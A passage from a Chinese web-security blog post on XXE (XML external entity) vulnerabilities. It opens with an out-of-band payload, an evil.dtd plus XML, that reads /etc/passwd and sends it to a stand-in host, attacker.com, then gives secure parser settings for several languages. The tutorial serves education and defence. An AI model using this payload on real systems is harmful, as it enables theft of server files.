+<p>我们就可以通过外部dtd嵌套一层实现我们想要的功能</p>
+<p>evil.dtd:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY % file SYSTEM &quot;file:///etc/passwd&quot;&gt;</span><br><span class="line">&lt;!ENTITY % all &quot;&lt;!ENTITY &amp;#x25; send SYSTEM &#x27;http://attacker.com/?%file;&#x27;&gt;&quot;&gt;</span><br><span class="line">%all;</span><br><span class="line">%send;</span><br></pre></td></tr></table></figure>
+
+<p>xml:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE foo [</span><br><span class="line">    &lt;!ENTITY % dtd SYSTEM &quot;http://attacker.com/evil.dtd&quot;&gt;</span><br><span class="line">    %dtd;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;root/&gt;</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><strong><code>%file</code></strong>：读取文件并存储其内容（如果是 PHP 环境，可能还需要 base64 编码以避免特殊字符）。</li>
+<li><strong><code>%all</code></strong>：其值是一个字符串：<code>&quot;&lt;!ENTITY % send SYSTEM &#39;http://attacker.com/?%file;&#39;&gt;&quot;</code>。注意这里使用了 <code>%</code> 来表示 <code>%</code>，这样在定义 <code>%all</code> 时，内部的 <code>%file</code> 不会被展开（因为它在字符串中）。</li>
+<li><strong><code>%all;</code></strong>：执行后，这个字符串被插入到 DTD 中，相当于定义了一个新的参数实体 <code>%send</code>，其 URI 中包含了 <code>%file</code>（此时 <code>%file</code> 已经被定义，但注意：在 <code>%send</code> 的定义中，<code>%file</code> 仍然是一个引用，不会立即展开）。</li>
+<li><strong><code>%send;</code></strong>：执行 <code>%send</code> 时，解析器会尝试展开它，而 URI 中的 <code>%file</code> 此时会被展开，从而得到包含文件内容的完整 URL，并向攻击者服务器发起请求。</li>
+</ul>
+<h2>四.防护</h2>
+
+<p>现代XML解析器通常默认禁用外部实体。</p>
+<h3>4.1.核心防御原则</h3>
+
+<ol>
+<li><strong>禁用 DTD</strong> —— 最彻底的防御，因为外部实体依赖于 DTD。</li>
+<li><strong>禁用外部实体</strong> —— 如果不能完全禁用 DTD，至少禁止加载外部实体。</li>
+<li><strong>使用安全的解析器配置</strong> —— 大多数现代 XML 库提供安全配置选项。</li>
+<li><strong>输入验证与过滤</strong> —— 对 XML 内容和结构进行白名单验证。</li>
+<li><strong>最小化 XML 使用</strong> —— 优先使用 JSON 等更安全的格式。</li>
+</ol>
+<h3>4.2.各平台/语言的具体防护配置</h3>
+
+<h4>4.2.1.Java</h4>
+
+<p><strong>使用 DocumentBuilderFactory</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();</span><br><span class="line"></span><br><span class="line">// 彻底禁用 DTD</span><br><span class="line">dbf.setFeature(&quot;http://apache.org/xml/features/disallow-doctype-decl&quot;, true);</span><br><span class="line"></span><br><span class="line">// 如果必须支持 DTD，则至少禁用外部实体</span><br><span class="line">dbf.setFeature(&quot;http://xml.org/sax/features/external-general-entities&quot;, false);</span><br><span class="line">dbf.setFeature(&quot;http://xml.org/sax/features/external-parameter-entities&quot;, false);</span><br><span class="line">dbf.setFeature(&quot;http://apache.org/xml/features/nonvalidating/load-external-dtd&quot;, false);</span><br><span class="line"></span><br><span class="line">// 禁用 XInclude</span><br><span class="line">dbf.setXIncludeAware(false);</span><br><span class="line">dbf.setExpandEntityReferences(false);</span><br><span class="line"></span><br><span class="line">// 设置安全处理</span><br><span class="line">dbf.setFeature(XMLConstants.FEATURE_SECURE_PROCESSING, true);</span><br><span class="line"></span><br><span class="line">DocumentBuilder builder = dbf.newDocumentBuilder();</span><br></pre></td></tr></table></figure>
+
+
+
+<p><strong>使用 SAXParser</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">SAXParserFactory spf = SAXParserFactory.newInstance();</span><br><span class="line">spf.setFeature(&quot;http://apache.org/xml/features/disallow-doctype-decl&quot;, true);</span><br><span class="line">spf.setFeature(&quot;http://xml.org/sax/features/external-general-entities&quot;, false);</span><br><span class="line">spf.setFeature(&quot;http://xml.org/sax/features/external-parameter-entities&quot;, false);</span><br><span class="line">spf.setXIncludeAware(false);</span><br><span class="line">SAXParser parser = spf.newSAXParser();</span><br></pre></td></tr></table></figure>
+
+
+
+<p><strong>使用 XMLInputFactory (StAX)</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">XMLInputFactory factory = XMLInputFactory.newInstance();</span><br><span class="line">factory.setProperty(XMLInputFactory.SUPPORT_DTD, false);</span><br><span class="line">factory.setProperty(XMLInputFactory.IS_SUPPORTING_EXTERNAL_ENTITIES, false);</span><br></pre></td></tr></table></figure>
+
+
+
+<p><strong>使用 XPath</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">XPathFactory xpf = XPathFactory.newInstance();</span><br><span class="line">xpf.setFeature(XMLConstants.FEATURE_SECURE_PROCESSING, true);</span><br></pre></td></tr></table></figure>
+
+
+
+<h4>4.2.2.PHP</h4>
+
+<p>PHP 使用 libxml2，可通过 <code>libxml_disable_entity_loader()</code> 控制实体加载。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">// 禁用外部实体加载（包括本地文件）</span><br><span class="line">libxml_disable_entity_loader(true);</span><br><span class="line"></span><br><span class="line">// 使用 DOMDocument 安全解析</span><br><span class="line">$dom = new DOMDocument();</span><br><span class="line">$dom-&gt;loadXML($xml, LIBXML_NOENT | LIBXML_DTDLOAD); // 危险！不要使用这些选项</span><br><span class="line">// 正确方式：</span><br><span class="line">$dom-&gt;loadXML($xml, LIBXML_NONET); // 禁用网络访问</span><br><span class="line"></span><br><span class="line">// 或者使用 SimpleXML</span><br><span class="line">$previous = libxml_disable_entity_loader(true);</span><br><span class="line">$xmlObject = simplexml_load_string($xml);</span><br><span class="line">libxml_disable_entity_loader($previous);</span><br></pre></td></tr></table></figure>
+
+<p><strong>注意</strong>：PHP 8.0 起 <code>libxml_disable_entity_loader()</code> 默认已为 true，但为了兼容性仍建议显式设置。</p>
+<h4>4.2.3.Python</h4>
+
+<p>Python 的 xml 库默认可能不安全，推荐使用 <code>defusedxml</code>。</p>
+<p><strong>使用 defusedxml（首选）</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">from defusedxml.ElementTree import parse</span><br><span class="line">et = parse(xml_file)  # 安全，自动阻止外部实体</span><br><span class="line"></span><br><span class="line">from defusedxml import minidom</span><br><span class="line">doc = minidom.parse(xml_file)</span><br></pre></td></tr></table></figure>
+
+<p><strong>若使用标准库，手动配置：</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">from xml.etree.ElementTree import XMLParser, parse</span><br><span class="line"></span><br><span class="line">parser = XMLParser()</span><br><span class="line">parser.entity = &#123;&#125;  # 清空实体字典，禁止外部实体</span><br><span class="line"># 或使用禁止DTD的解析器</span><br><span class="line">parser = XMLParser( forbid_dtd=True )</span><br></pre></td></tr></table></figure>
+
+
+
+<p><strong>lxml 安全配置</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">from lxml import etree</span><br><span class="line"></span><br><span class="line">parser = etree.XMLParser(</span><br><span class="line">    resolve_entities=False,   # 禁用实体解析</span><br><span class="line">    no_network=True,          # 禁用网络访问</span><br><span class="line">    load_dtd=False,           # 不加载DTD</span><br><span class="line">    dtd_validation=False      # 不进行DTD验证</span><br><span class="line">)</span><br><span class="line">tree = etree.parse(xml_file, parser)</span><br></pre></td></tr></table></figure>
+
+
+
+<h4>4.2.4.NET (C#)</h4>
+
+<p><strong>XmlReader 安全设置</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">XmlReaderSettings settings = new XmlReaderSettings();</span><br><span class="line"></span><br><span class="line">// 禁用 DTD</span><br><span class="line">settings.DtdProcessing = DtdProcessing.Prohibit;</span><br><span class="line"></span><br><span class="line">// 或更严格的：如果必须支持DTD，则禁止外部实体</span><br><span class="line">settings.DtdProcessing = DtdProcessing.Parse;</span><br><span class="line">settings.MaxCharactersFromEntities = 1024;  // 限制实体扩展</span><br><span class="line">settings.XmlResolver = null;                 // 禁止解析外部资源</span><br><span class="line"></span><br><span class="line">using (XmlReader reader = XmlReader.Create(stream, settings))</span><br><span class="line">&#123;</span><br><span class="line">    XDocument doc = XDocument.Load(reader);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+<p><strong>使用 XDocument &#x2F; XmlDocument 时</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">XmlDocument doc = new XmlDocument();</span><br><span class="line">doc.XmlResolver = null;  // 禁止外部资源解析</span><br><span class="line">doc.LoadXml(xmlString);</span><br></pre></td></tr></table></figure>
+
+
+<h4>4.2.5.Node.js / JavaScript</h4>
+
+<p><strong>使用 <code>xml2js</code> 或 <code>xmldom</code> 时手动防范</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">// xmldom 示例</span><br><span class="line">const &#123; DOMParser &#125; = require(&#x27;xmldom&#x27;);</span><br><span class="line">const parser = new DOMParser(&#123;</span><br><span class="line">    errorHandler: &#123; warning: () =&gt; &#123;&#125; &#125;,</span><br><span class="line">    locator: &#123;&#125;,</span><br><span class="line">    // 禁用外部实体</span><br><span class="line">    externalEntity: () =&gt; null</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">// 使用 fast-xml-parser（推荐）</span><br><span class="line">const parser = new XMLParser(&#123;</span><br><span class="line">    ignoreAttributes: false,</span><br><span class="line">    allowBooleanAttributes: true,</span><br><span class="line">    parseAttributeValue: true,</span><br><span class="line">    // 禁用外部实体</span><br><span class="line">    processEntities: false,</span><br><span class="line">    // 禁止 DTD</span><br><span class="line">    allowProtoParsing: false</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>
+
+<p>在浏览器端，同源策略通常限制外部实体，但仍需注意 XHR 响应解析。</p>
+<h4>4.2.6.Ruby</h4>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">require &#x27;nokogiri&#x27;</span><br><span class="line"></span><br><span class="line"># 安全解析</span><br><span class="line">doc = Nokogiri::XML.parse(xml_string) do |config|</span><br><span class="line">  config.nonet   # 禁用网络连接</span><br><span class="line">  config.noent   # 禁用外部实体</span><br><span class="line">  config.dtdload # 禁止加载外部DTD</span><br><span class="line">end</span><br></pre></td></tr></table></figure>
+
+
+
+<h3>4.3.输入验证与过滤</h3>
+
+<p>即使配置了解析器，也应对 XML 内容进行验证：</p>
+<ul>
+<li><strong>使用 XML Schema (XSD) 验证</strong>：确保 XML 符合预期的结构和数据类型，可以拒绝包含 DOCTYPE 的文档。</li>
+<li><strong>白名单校验</strong>：如果业务不需要 DTD，可以简单检查 XML 是否包含 <code>&lt;!DOCTYPE</code> 并拒绝。</li>
+<li><strong>内容长度限制</strong>：防止利用 XML 实体展开进行 DoS（如 Billion Laughs 攻击）。</li>
+</ul>
+<p>示例：拒绝包含 DOCTYPE 的 XML</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">if &#x27;&lt;!DOCTYPE&#x27; in xml_string.upper():</span><br><span class="line">    raise ValueError(&quot;DOCTYPE not allowed&quot;)</span><br></pre></td></tr></table></figure>
+
+<p>但注意，攻击者可能通过编码绕过简单检测，因此应优先在解析器层面禁用。</p>
+<p>参考链接：<br><a target="_blank" rel="noopener" href="https://websec.readthedocs.io/zh/latest/vuln/xxe.html">https://websec.readthedocs.io/zh/latest/vuln/xxe.html</a><br><a target="_blank" rel="noopener" href="https://portswigger.net/web-security/xxe">https://portswigger.net/web-security/xxe</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/web/330777.html">https://www.freebuf.com/articles/web/330777.html</a></p>
+
+    </div>
+  </article>
+  <div class="ccbyncsa">
+    <div class="container">
+        <div class="row">
+            <div class="col-md-12">
+                <div class="copyright">
+                    <div class="author">
+                        <p>作者</p>
+                        <p>yunli</p>
+                    </div>
+                    <div class="title">
+                        <p>标题</p>
+                        <p>从0到1了解XXE</p>
+                    </div>
+                        <div class="publish">
+                            <p>发布于</p>
+                            <p>2026-01-21</p>
+                        </div>
+                    <div class="ccbyncsa-icon">
+                        <p>授权协议</p>
+                        <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">
+                        <p class="ccbyncsa-icon-imgs" style="display: flex;">
+                        <img src="/images/cc.svg" alt="cc">
+                        <img src="/images/by.svg" alt="by">
+                        <img src="/images/nc.svg" alt="nc">
+                        <img src="/images/sa.svg" alt="sa">
+                        </p>
+                        </a>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+  <nav class="post-pagination">
+    
+      <div class="post-prev">
+        <span class="nav-label">上一篇</span>
+        <a href="/2026/01/14/%E4%B8%80%E7%AF%87%E6%96%87%E7%AB%A0%E4%BA%86%E8%A7%A3XSS/">一篇文章了解XSS</a>
+      </div>
+    
+    
+  </nav>
+  
+
+</div>
+
+<script src="/js/copy.js"></script>
+
+<aside class="sidebar-container sidebar-right">
+    <div class="sidebar-bg">
+        <p id="date"></p>
+<script>
+  function updateDate() {
+    var now = new Date();
+    var dateString = now.toISOString().slice(0, 10);
+    document.getElementById('date').textContent = dateString;
+  }
+
+  window.addEventListener('load', function() {
+    updateDate();
+    // 更新频率为每5分钟更新一次，减少不必要的更新
+    setInterval(updateDate, 300000);
+  });
+</script>
+        <span id="clock" role="timer" aria-live="polite"></span>
+
+
+<script>
+  document.addEventListener('DOMContentLoaded', function() {
+    const clockElement = document.getElementById('clock');
+    let timerInterval;
+
+    // 格式化时间函数
+    function formatTime(unit) {
+      return unit < 10 ? '0' + unit : unit;
+    }
+
+    // 更新时钟 - 包含秒
+    function updateClock() {
+      const now = new Date();
+      const hours = formatTime(now.getHours());
+      const minutes = formatTime(now.getMinutes());
+      const seconds = formatTime(now.getSeconds());
+      clockElement.textContent = `${hours}:${minutes}:${seconds}`;
+    }
+
+    // 初始化时钟
+    function startClock() {
+      // 立即更新一次时间
+      updateClock();
+      // 每秒更新一次
+      timerInterval = setInterval(updateClock, 1000);
+    }
+
+    // 页面可见性变化时的优化
+    document.addEventListener('visibilitychange', function() {
+      if (document.hidden) {
+        // 页面不可见时停止更新
+        clearInterval(timerInterval);
+      } else {
+        // 页面重新可见时，重新开始
+        clearInterval(timerInterval);
+        startClock();
+      }
+    });
+
+    // 启动时钟
+    startClock();
+  });
+</script>
+
+
+    </div>
+    <div class="sidebar-bg">
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link"><span class="toc-number">1.</span> <span class="toc-text">一.什么是XXE漏洞</span></a></li><li class="toc-item toc-level-2"><a class="toc-link"><span class="toc-number">2.</span> <span class="toc-text">二.XML介绍</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link"><span class="toc-number">2.1.</span> <span class="toc-text">2.1. XML基础</span></a></li><li class="toc-item toc-level-3"><a class="toc-link"><span class="toc-number">2.2.</span> <span class="toc-text">2.2. 基本语法</span></a></li><li class="toc-item toc-level-3"><a class="toc-link"><span class="toc-number">2.3.</span> <span class="toc-text">2.3.dtd</span></a></li><li class="toc-item toc-level-3"><a class="toc-link"><span class="toc-number">2.4.</span> <span class="toc-text">2.4.实体</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link"><span class="toc-number">2.4.1.</span> <span class="toc-text">内部实体：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link"><span class="toc-number">2.4.2.</span> <span class="toc-text">外部实体</span></a></li><li class="toc-item toc-level-4"><a class="toc-link"><span class="toc-number">2.4.3.</span> <span class="toc-text">通用实体:</span></a></li><li class="toc-item toc-level-4"><a class="toc-link"><span class="toc-number">2.4.4.</span> <span class="toc-text">参数实体：</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link"><span class="toc-number">3.</span> <span class="toc-text">三.XXE攻击</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#3-1-%E6%8B%92%E7%BB%9D%E6%9C%8D%E5%8A%A1%E6%94%BB%E5%87%BB"><span class="toc-number">3.1.</span> <span class="toc-text">3.1. 拒绝服务攻击</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-2-%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96"><span class="toc-number">3.2.</span> <span class="toc-text">3.2. 文件读取</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-3-SSRF"><span class="toc-number">3.3.</span> <span class="toc-text">3.3. SSRF</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-4-RCE"><span class="toc-number">3.4.</span> <span class="toc-text">3.4. RCE</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-5-XInclude"><span class="toc-number">3.5.</span> <span class="toc-text">3.5. XInclude</span></a></li><li class="toc-item toc-level-3"><a class="toc-link"><span class="toc-number">3.6.</span> <span class="toc-text">3.6.修改内容</span></a></li><li class="toc-item toc-level-3"><a class="toc-link"><span class="toc-number">3.7.</span> <span class="toc-text">3.7.文件上传</span></a></li><li class="toc-item toc-level-3"><a class="toc-link"><span class="toc-number">3.8.</span> <span class="toc-text">3.8.绕过方式</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link"><span class="toc-number">4.</span> <span class="toc-text">四.防护</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link"><span class="toc-number">4.1.</span> <span class="toc-text">4.1.核心防御原则</span></a></li><li class="toc-item toc-level-3"><a class="toc-link"><span class="toc-number">4.2.</span> <span class="toc-text">4.2.各平台&#x2F;语言的具体防护配置</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link"><span class="toc-number">4.2.1.</span> <span class="toc-text">4.2.1.Java</span></a></li><li class="toc-item toc-level-4"><a class="toc-link"><span class="toc-number">4.2.2.</span> <span class="toc-text">4.2.2.PHP</span></a></li><li class="toc-item toc-level-4"><a class="toc-link"><span class="toc-number">4.2.3.</span> <span class="toc-text">4.2.3.Python</span></a></li><li class="toc-item toc-level-4"><a class="toc-link"><span class="toc-number">4.2.4.</span> <span class="toc-text">4.2.4.NET (C#)</span></a></li><li class="toc-item toc-level-4"><a class="toc-link"><span class="toc-number">4.2.5.</span> <span class="toc-text">4.2.5.Node.js &#x2F; JavaScript</span></a></li><li class="toc-item toc-level-4"><a class="toc-link"><span class="toc-number">4.2.6.</span> <span class="toc-text">4.2.6.Ruby</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link"><span class="toc-number">4.3.</span> <span class="toc-text">4.3.输入验证与过滤</span></a></li></ol></li></ol>
+    </div>
+    <div class="sidebar-bg">
+        <div class="card-tags">
+            
+                <a href="/tags/xxe/" class="tag" aria-label="标签: #xxe">#xxe</a>
+            
+        </div>
+    </div>
+    <div>
+        <div class="categories-list">
+            
+                <div class="category-item">
+                    <a href="/categories/web/" aria-label="分类: web">
+                        web
+                        <span>(3)</span>
+                    </a>
+                </div>
+            
+        </div>
+    </div>
+</aside>
+
+    <!-- No categories available -->
+
+
+    <footer>
+    <span id="busuanzi_container_site_pv" style="display: inline;"></span>
+    <span>👁<span id="busuanzi_value_site_pv"></span></span>
+    <div class="padding border border-sub border-dotted fadein-right">
+        <span style="color:aliceblue">👤<span id="busuanzi_value_site_uv"></span></span>
+    </div>
+    <!-- <span>
+        由 <a target="_blank" rel="noopener" href="https://hexo.io" alt="Hexo">
+            <p class="hover-underline night" style="display: inline;">Hexo</p>
+        </a> 驱动
+        <p style="display: inline; color: red;">❤</p>
+        <a target="_blank" rel="noopener" href="https://github.com/xingwangzhe/hexo-theme-wang" alt="Wang">
+            <p class="hover-underline night" style="display: inline;">Wang</p>
+        </a> 主题构建
+    </span> -->
+
+    <!-- 带图片的链接 -->
+    <!-- <div class="footer-links">
+        
+            
+                <a href="https://www.travellings.cn/go.html" target="_blank" rel="noopener">
+                    <img src="https://www.travellings.cn/assets/logo.gif" alt="开往-友链接力" title="开往-友链接力">
+                </a>
+            
+                <a href="https://www.aliyun.com/minisite/goods?userCode=lmvvqvl9" target="_blank" rel="noopener">
+                    <img src="https://i.ibb.co/h7XJkfm/LOGO.png" alt="阿里云支持" title="阿里云支持">
+                </a>
+            
+                <a href="https://www.dalao.net/" target="_blank" rel="noopener">
+                    <img src="https://www.dalao.net/img/dalao-svg.svg" alt="大佬论坛" title="大佬论坛">
+                </a>
+            
+                <a href="https://bf.zzxworld.com/" target="_blank" rel="noopener">
+                    <img src="https://bf.zzxworld.com/images/logo-v2.png" alt="BlogFinder" title="BlogFinder">
+                </a>
+            
+                <a href="https://www.blogsclub.org/go" target="_blank" rel="noopener">
+                    <img src="https://www.blogsclub.org/images/shuttle_4.png" alt="空间穿梭-随机访问BlogsClub成员博客" title="空间穿梭-随机访问BlogsClub成员博客">
+                </a>
+            
+        
+    </div> -->
+
+    <!-- 纯文本链接 -->
+    <div class="footer-text-links">
+        
+            
+                <a href="" target="_blank" rel="noopener">
+                    我与我周旋久
+                </a>
+            
+        
+    </div>
+</footer>
+    
+<script src="/js/background.js"></script>
+    
+        
+<script src="/js/search.js"></script>
+    
+</main>
+</body>
+</html>
